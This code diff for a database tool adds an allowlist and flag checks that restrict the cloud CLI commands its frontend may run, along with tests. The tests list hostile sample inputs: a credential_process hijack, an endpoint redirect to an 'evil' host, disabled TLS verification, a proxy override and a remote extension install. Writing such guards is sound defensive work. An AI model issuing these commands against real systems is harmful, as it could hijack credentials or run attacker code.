@@ -325,6 +325,82 @@ pub async fn run(
     Err(AppError::msg(describe_failure(&stderr, &stdout)))
 }
 
+/// The command groups the frontend runs, as `(group, subcommands)`; an empty
+/// list allows every subcommand. Anything else (`aws configure set`, `az
+/// extension add`, `gcloud components`) could change how the CLI signs in or
+/// run code, so `cloud_cli` refuses it.
+fn allowed_commands(provider: Provider) -> &'static [(&'static str, &'static [&'static str])] {
+    match provider {
+        Provider::Aws => &[
+            ("sso", &["login"]),
+            ("sts", &["get-caller-identity"]),
+            ("configure", &["list-profiles", "get"]),
+            ("secretsmanager", &["get-secret-value"]),
+            ("rds", &[]),
+            ("docdb", &[]),
+            ("ec2", &[]),
+        ],
+        Provider::Gcp => &[
+            ("auth", &["login", "list"]),
+            ("config", &["get-value"]),
+            ("projects", &["list"]),
+            ("sql", &[]),
+        ],
+        Provider::Azure => &[
+            ("login", &[]),
+            ("account", &["list", "show"]),
+            ("group", &["list", "create"]),
+            ("postgres", &[]),
+            ("mysql", &[]),
+            ("sql", &[]),
+            ("cosmosdb", &[]),
+        ],
+        Provider::Railway => &[
+            ("whoami", &[]),
+            ("api", &[]),
+            ("init", &[]),
+            ("link", &[]),
+            ("add", &[]),
+        ],
+        Provider::Fly => &[("auth", &["login", "whoami"]), ("orgs", &[]), ("mpg", &[])],
+        Provider::Render | Provider::Cloudflare => &[],
+    }
+}
+
+/// Checks arguments from the frontend against `allowed_commands`, and rejects
+/// flags that point the CLI at another endpoint or turn off TLS checks.
+pub fn check_args(provider: Provider, args: &[String]) -> AppResult<()> {
+    let refuse = || {
+        AppError::msg(format!(
+            "dbms-tool doesn't run \"{} {}\"",
+            provider.program(),
+            args.iter().take(2).cloned().collect::<Vec<_>>().join(" ")
+        ))
+    };
+    let group = args.first().ok_or_else(refuse)?;
+    let (_, subcommands) = allowed_commands(provider)
+        .iter()
+        .find(|(g, _)| g == group)
+        .ok_or_else(refuse)?;
+    if !subcommands.is_empty()
+        && !args
+            .get(1)
+            .is_some_and(|s| subcommands.contains(&s.as_str()))
+    {
+        return Err(refuse());
+    }
+    for arg in args {
+        let flag = arg.split('=').next().unwrap_or_default();
+        let redirects = matches!(flag, "--endpoint-url" | "--ca-bundle" | "--no-verify-ssl")
+            // gcloud reads flags from the secret file the app writes, never another
+            || (flag == "--flags-file" && arg != &format!("--flags-file={SECRET_TOKEN}"));
+        if redirects {
+            return Err(AppError::msg(format!("dbms-tool doesn't pass {flag}")));
+        }
+    }
+    Ok(())
+}
+
 /// The useful part of a CLI's error output: drops blank lines, warnings and
 /// upgrade nags, keeping the error itself.
 fn describe_failure(stderr: &str, stdout: &str) -> String {
@@ -658,6 +734,75 @@ pub async fn api(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn strings(args: &[&str]) -> Vec<String> {
+        args.iter().map(|a| a.to_string()).collect()
+    }
+
+    #[test]
+    fn cli_allowlist_takes_what_the_frontend_runs() {
+        let ok = [
+            (
+                Provider::Aws,
+                &["rds", "describe-db-instances", "--profile", "p"][..],
+            ),
+            (Provider::Aws, &["configure", "list-profiles"]),
+            (
+                Provider::Aws,
+                &["secretsmanager", "get-secret-value", "--secret-id", "x"],
+            ),
+            (
+                Provider::Gcp,
+                &["sql", "instances", "create", "db", "--flags-file={secret}"],
+            ),
+            (
+                Provider::Gcp,
+                &["auth", "login", "--brief", "--no-activate"],
+            ),
+            (Provider::Azure, &["login", "--output", "none"]),
+            (Provider::Azure, &["cosmosdb", "keys", "list"]),
+            (Provider::Railway, &["api", "query { me { id } }"]),
+            (Provider::Fly, &["mpg", "destroy", "abc", "--yes"]),
+        ];
+        for (provider, args) in ok {
+            assert!(check_args(provider, &strings(args)).is_ok(), "{args:?}");
+        }
+    }
+
+    #[test]
+    fn cli_allowlist_refuses_everything_else() {
+        let refused = [
+            (
+                Provider::Aws,
+                &["configure", "set", "credential_process", "calc"][..],
+            ),
+            (Provider::Aws, &["s3", "cp", "s3://b/x", "."]),
+            (
+                Provider::Aws,
+                &["rds", "describe-db-instances", "--endpoint-url=http://evil"],
+            ),
+            (
+                Provider::Aws,
+                &["rds", "describe-db-instances", "--no-verify-ssl"],
+            ),
+            (Provider::Gcp, &["components", "install", "x"]),
+            (Provider::Gcp, &["config", "set", "proxy/address", "evil"]),
+            (
+                Provider::Gcp,
+                &["sql", "instances", "list", "--flags-file=/tmp/other"],
+            ),
+            (
+                Provider::Azure,
+                &["extension", "add", "--source", "http://evil/x.whl"],
+            ),
+            (Provider::Fly, &["ssh", "console"]),
+            (Provider::Render, &["anything"]),
+            (Provider::Aws, &[]),
+        ];
+        for (provider, args) in refused {
+            assert!(check_args(provider, &strings(args)).is_err(), "{args:?}");
+        }
+    }
 
     fn connection(engine: Engine, host: &str, cloud: serde_json::Value) -> ConnectionConfig {
         serde_json::from_value(serde_json::json!({
